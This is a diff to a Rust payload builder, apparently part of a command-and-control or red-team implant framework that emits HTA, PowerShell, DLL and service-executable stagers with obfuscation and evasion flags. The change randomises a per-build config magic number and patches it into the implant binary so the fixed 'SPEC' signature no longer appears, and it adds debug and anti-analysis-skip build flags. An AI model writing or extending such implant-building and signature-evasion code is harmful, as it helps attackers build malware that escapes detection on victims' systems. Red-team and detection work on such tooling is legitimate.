@@ -4,14 +4,17 @@ pub mod obfuscation;
 pub mod yara;
 
 pub use config_gen::{
-    generate_config, generate_config_with_evasion, ChannelConfig, EvasionFlags, GeneratedConfig,
-    SleepConfig,
+    generate_config, generate_config_with_evasion, generate_config_with_magic, ChannelConfig,
+    EvasionFlags, GeneratedConfig, SleepConfig, DEFAULT_CONFIG_MAGIC,
 };
 pub use formats::{
     format_dll, format_dotnet, format_hta_stager, format_ps1_stager, format_raw,
     format_service_exe, list_formats, FormatInfo,
 };
-pub use obfuscation::{obfuscate, ObfuscationError, ObfuscationSettings};
+pub use obfuscation::{
+    obfuscate, obfuscate_blob, ObfuscationError, ObfuscationResult, ObfuscationSettings,
+    RandomizedMagics,
+};
 pub use yara::{scan_payload, YaraError, YaraMatch};
 
 use std::collections::HashMap;
@@ -214,6 +217,8 @@ impl PayloadBuilder {
             sleep_config,
             kill_date,
             EvasionFlags::default(),
+            false,
+            false,
         )
     }
 
@@ -226,6 +231,8 @@ impl PayloadBuilder {
         sleep_config: &SleepConfig,
         kill_date: Option<i64>,
         evasion: EvasionFlags,
+        debug_mode: bool,
+        skip_anti_analysis: bool,
     ) -> Result<BuildResult, BuilderError> {
         // Get the PIC blob for key derivation (implant derives key from SHA256 of first 64 bytes)
         let pic_blob = self
@@ -234,8 +241,22 @@ impl PayloadBuilder {
             .map(|t| t.data.as_slice())
             .unwrap_or(&[]);
 
-        // Generate config with evasion flags + PIC blob for key derivation
-        let gen = generate_config_with_evasion(
+        // Generate a per-build random config magic. This replaces the fixed
+        // 0x53504543 ("SPEC") in both the config blob header/AAD and the
+        // implant's patchable cfg_magic_marker region.
+        let config_magic: u32 = {
+            let mut rng = rand::thread_rng();
+            loop {
+                let v: u32 = rand::Rng::gen(&mut rng);
+                if v != 0 && v != DEFAULT_CONFIG_MAGIC {
+                    break v;
+                }
+            }
+        };
+
+        // Generate config with the per-build magic so the AEAD AAD matches
+        // what the implant will read from its patched cfg_magic_marker region.
+        let gen = generate_config_with_magic(
             profile,
             server_pubkey,
             channels,
@@ -243,6 +264,7 @@ impl PayloadBuilder {
             kill_date,
             evasion,
             pic_blob,
+            config_magic,
         )?;
 
         let build_id = uuid::Uuid::new_v4().to_string();
@@ -283,6 +305,28 @@ impl PayloadBuilder {
                 OutputFormat::RawShellcode => unreachable!(),
             }
         };
+
+        let mut payload = payload;
+
+        // Patch the per-build config magic into the SPECCFGM marker region
+        // in the PIC blob. The marker is 8 bytes ("SPECCFGM") followed by
+        // 4 bytes where we write the config_magic (LE). The marker itself
+        // is scrubbed later by scrub_markers() in the obfuscation pipeline.
+        const SPECCFGM: &[u8; 8] = b"SPECCFGM";
+        if let Some(marker_pos) = find_marker(&payload, SPECCFGM) {
+            let magic_offset = marker_pos + SPECCFGM.len();
+            if magic_offset + 4 <= payload.len() {
+                payload[magic_offset..magic_offset + 4]
+                    .copy_from_slice(&config_magic.to_le_bytes());
+            }
+        }
+
+        // Patch build flags (debug mode, skip anti-analysis) into the PIC blob
+        // via the SPBF marker. This must happen AFTER payload assembly so the
+        // marker is present in the final binary.
+        if debug_mode || skip_anti_analysis {
+            obfuscation::patch_build_flags(&mut payload, debug_mode, skip_anti_analysis);
+        }
 
         Ok(BuildResult {
             payload,
